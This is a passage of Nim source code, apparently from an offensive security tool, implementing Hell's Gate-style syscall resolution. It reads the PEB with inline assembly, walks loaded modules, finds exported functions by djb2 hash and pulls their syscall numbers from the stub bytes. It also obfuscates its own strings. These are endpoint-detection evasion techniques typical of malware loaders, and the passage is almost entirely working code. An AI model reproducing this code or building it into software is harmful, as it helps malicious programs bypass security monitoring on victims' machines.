            pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
            pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
            pAddrOfOrdinals     : ptr UncheckedArray[WORD]  = cast[ptr UncheckedArray[WORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNameOrdinals)
    
        while cx < numFuncs:    
            var 
                pFuncOrdinal    : WORD      = pAddrOfOrdinals[cx]
                pFuncName       : cstring    = $(cast[PCHAR](cast[ByteAddress](pImageBase) + pAddrOfNames[cx]))
                funcHash        : uint64    = djb2_hash(pFuncName)
                funcRVA         : DWORD64   = pAddrOfFunctions[pFuncOrdinal]
                pFuncAddr       : PVOID     = cast[PVOID](cast[ByteAddress](pImageBase) + funcRVA)
            
            if funcHash == tableEntry.dwHash:
    
                tableEntry.pAddress = pFuncAddr
                if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                    tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
    
                return true
            inc cx
        return false
    
    proc GetPEBAsm64*(): PPEB {.asmNoStackFrame.} =
        asm ===
            mov rax, qword ptr gs:[0x60]
            ret
        ===
    
    proc getNextModule*(flink : var LIST_ENTRY) : PLDR_DATA_TABLE_ENTRY =
        flink = flink.Flink[]
        return flinkToModule(flink)
    
    proc searchLoadedModules*(pCurrentPeb : PPEB, tableEntry : var HG_TABLE_ENTRY) : bool =
        var 
            currFlink       : LIST_ENTRY                = pCurrentPeb.Ldr.InMemoryOrderModuleList.Flink[]
            currModule      : PLDR_DATA_TABLE_ENTRY     = flinkToModule(currFlink)                 
            moduleName      : string
            pExportTable    : PIMAGE_EXPORT_DIRECTORY
        let 
            beginModule = currModule
        
        while true:
    
            moduleName = $moduleToBuffer(currModule)
    
            if moduleName.len() == 0 or moduleName in paramStr(0):            
                currModule = getNextModule(currFlink)
                if beginModule == currModule:
                    break
                continue
    
            if not getExportTable(currModule, pExportTable):
                echo obf("[-] Failed to get export table...")
                return false
    
            if getTableEntry(currModule.DLLBase, pExportTable, tableEntry):
                return true
            
            currModule = getNextModule(currFlink)
            if beginModule == currModule:
                break
        return false
    
    proc getSyscall*(tableEntry : var HG_TABLE_ENTRY) : bool =
        
        let currentPeb  : PPEB = GetPEBAsm64()
           
        if not searchLoadedModules(currentPeb, tableEntry):
            return false
    
        return true


"""

